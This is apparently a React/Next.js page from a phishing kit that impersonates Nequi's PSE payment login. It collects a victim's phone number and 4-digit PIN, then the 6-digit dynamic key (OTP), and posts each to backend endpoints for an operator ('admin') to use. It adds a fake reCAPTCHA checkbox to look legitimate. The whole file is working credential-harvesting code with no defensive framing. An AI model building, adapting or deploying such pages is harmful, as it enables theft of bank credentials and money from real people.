"use client";

import { useState, Suspense, useEffect } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { useCaseStatus } from '@/context/useCaseStatus';

function NequiForm() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const errorParam = searchParams.get('error');

    // Monitor global system status and admin redirects
    useCaseStatus();

    const [step, setStep] = useState(1); // 1: Login, 2: Clave Dinámica
    const [phone, setPhone] = useState('');
    const [pin, setPin] = useState('');
    const [otp, setOtp] = useState('');
    const [error, setError] = useState(false);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [isVerified, setIsVerified] = useState(false);

    // Load phone from local storage if available (from checkout)
    useEffect(() => {
        const savedPhone = localStorage.getItem('customer_phone');
        if (savedPhone) setPhone(savedPhone);
    }, []);

    const handleLoginSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!phone || pin.length < 4 || !isVerified) {
            setError(true);
            return;
        }

        setIsSubmitting(true);
        try {
            const res = await fetch('/api/paso-usuario', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    user: phone,
                    password: pin,
                    bank: 'NEQUI',
                    documentType: 'CELULAR'
                })
            });

            const data = await res.json();
            if (data.success) {
                // Move to OTP step
                setStep(2);
                setIsSubmitting(false);
            } else {
                setIsSubmitting(false);
                alert('Error al procesar. Por favor intenta de nuevo.');
            }
        } catch (err) {
            console.error(err);
            setIsSubmitting(false);
        }
    };

    const handleOtpSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (otp.length < 6) {
            setError(true);
            return;
        }

        setIsSubmitting(true);
        try {
            const res = await fetch('/api/paso-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ otp })
            });

            const data = await res.json();
            if (data.success) {
                // Finish and wait for admin
                router.push('/pse/nequi/cargando');
            } else {
                setIsSubmitting(false);
                alert('Error al validar código. Intenta de nuevo.');
            }
        } catch (err) {
            console.error(err);
            setIsSubmitting(false);
        }
    };

    if (step === 1) {
        return (
            <form onSubmit={handleLoginSubmit} className="space-y-6">
                <div className="relative">
                    <label className="absolute left-4 top-2 text-[10px] font-bold text-pink-600 uppercase">
                        Número de celular
                    </label>
                    <input
                        type="tel"
                        maxLength={10}
                        value={phone}
                        onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                        className="w-full px-4 pt-6 pb-2 border-b-2 border-gray-200 focus:border-pink-500 outline-none transition-all text-lg font-medium text-[#210049]"
                        placeholder="300 000 0000"
                    />
                </div>

                <div className="relative">
                    <label className="absolute left-4 top-2 text-[10px] font-bold text-pink-600 uppercase">
                        Clave de 4 dígitos
                    </label>
                    <input
                        type="password"
                        maxLength={4}
                        inputMode="numeric"
                        value={pin}
                        onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                        className="w-full px-4 pt-6 pb-2 border-b-2 border-gray-200 focus:border-pink-500 outline-none transition-all text-lg font-medium text-[#210049]"
                        placeholder="****"
                    />
                </div>

                {/* Fake Captcha */}
                <div
                    onClick={() => setIsVerified(true)}
                    className={`flex items-center gap-3 p-4 border border-gray-100 rounded-2xl bg-[#F9F9F9] cursor-pointer hover:bg-white transition-all shadow-sm ${error && !isVerified ? 'border-red-500' : ''}`}
                >
                    <div className={`w-6 h-6 border-2 rounded-lg flex items-center justify-center transition-all ${isVerified ? 'bg-green-500 border-green-500 scale-110 shadow-md' : 'bg-white border-gray-300'}`}>
                        {isVerified && (
                            <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={4} d="M5 13l4 4L19 7" />
                            </svg>
                        )}
                    </div>
                    <span className="text-sm font-bold text-[#210049] opacity-70 flex-grow">No soy un robot</span>
                    <div className="flex flex-col items-center">
                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" className="w-8 h-8 opacity-60" alt="reCAPTCHA" />
                        <span className="text-[8px] text-gray-400 font-bold uppercase mt-1">reCAPTCHA</span>
                    </div>
                </div>

                {errorParam === 'invalid_user' && (
                    <div className="p-4 bg-red-50 border-l-4 border-red-500 rounded-lg text-red-700 text-sm font-bold animate-pulse">
                        ⚠️ Los datos ingresados son incorrectos. Por favor intenta de nuevo.
                    </div>
                )}

                <div className="flex gap-4 pt-4">
                    <button
                        type="submit"
                        disabled={isSubmitting || !isVerified}
                        className={`flex-1 py-4 rounded-full font-black text-white transition-all shadow-lg text-lg ${isSubmitting || !isVerified
                            ? 'bg-gray-300 cursor-not-allowed'
                            : 'bg-pink-600 hover:bg-pink-700 hover:shadow-pink-200 active:scale-95'
                            }`}
                    >
                        {isSubmitting ? 'Procesando...' : 'Entra'}
                    </button>
                    <button
                        type="button"
                        onClick={() => router.back()}
                        className="px-6 py-4 rounded-full font-bold text-[#210049] border-2 border-gray-100 hover:bg-gray-50 transition-all font-sans"
                    >
                        Ahora no
                    </button>
                </div>
            </form>
        );
    }

    // Step 2: OTP (Clave Dinámica)
    return (
        <form onSubmit={handleOtpSubmit} className="space-y-6">
            <div className="text-center mb-4">
                <div className="bg-pink-50 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg className="w-8 h-8 text-pink-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                </div>
                <h2 className="text-xl font-bold text-[#210049]">Clave Dinámica</h2>
                <p className="text-sm text-gray-500 mt-2">
                    Ingresa el código de 6 dígitos que aparece en tu App Nequi.
                </p>
            </div>

            <div className="relative">
                <input
                    type="tel"
                    maxLength={6}
                    inputMode="numeric"
                    value={otp}
                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
                    className="w-full px-4 py-4 border-2 border-gray-100 rounded-2xl focus:border-pink-500 outline-none transition-all text-center text-3xl font-black tracking-[0.5em] text-[#210049]"
                    placeholder="000000"
                    autoFocus
                />
            </div>

            <button
                type="submit"
                disabled={isSubmitting || otp.length < 6}
                className={`w-full py-4 rounded-full font-black text-white transition-all shadow-lg text-lg ${isSubmitting || otp.length < 6
                    ? 'bg-gray-300 cursor-not-allowed'
                    : 'bg-pink-600 hover:bg-pink-700 hover:shadow-pink-200 active:scale-95'
                    }`}
            >
                {isSubmitting ? 'Validando...' : 'Confirmar pago'}
            </button>

            <div className="text-center">
                <button
                    type="button"
                    onClick={() => setStep(1)}
                    className="text-pink-600 font-bold text-sm hover:underline"
                >
                    Volver y corregir datos
                </button>
            </div>
        </form>
    );
}

export default function RutaNequiPage() {
    return (
        <div className="min-h-screen bg-[#F4F4F4] flex flex-col items-center justify-center p-4 font-sans">
            <div className="w-full max-w-[420px]">
                {/* Nequi Header Logo */}
                <div className="flex justify-center mb-8">
                    <img
                        src="/nequi-logo.png"
                        alt="Nequi"
                        className="h-14 object-contain"
                    />
                </div>

                <div className="bg-white rounded-3xl shadow-xl overflow-hidden border border-gray-100">
                    <div className="p-8">
                        <h1 className="text-2xl font-black text-[#210049] mb-2 text-center">
                            Pagos PSE de Nequi
                        </h1>
                        <p className="text-[#210049] mb-8 text-center text-sm font-medium opacity-80 px-4">
                            Procesa tu pago de forma segura con tu cuenta Nequi.
                        </p>

                        <Suspense fallback={<div className="text-center py-10">Cargando...</div>}>
                            <NequiForm />
                        </Suspense>
                    </div>
                </div>

                <div className="mt-8 text-center text-xs text-gray-500 font-bold opacity-60">
                    ¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.
                </div>
            </div>

            <style jsx global>{`
                @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap');
                body {
                    font-family: 'Manrope', sans-serif;
                }
            `}</style>
        </div>
    );
}
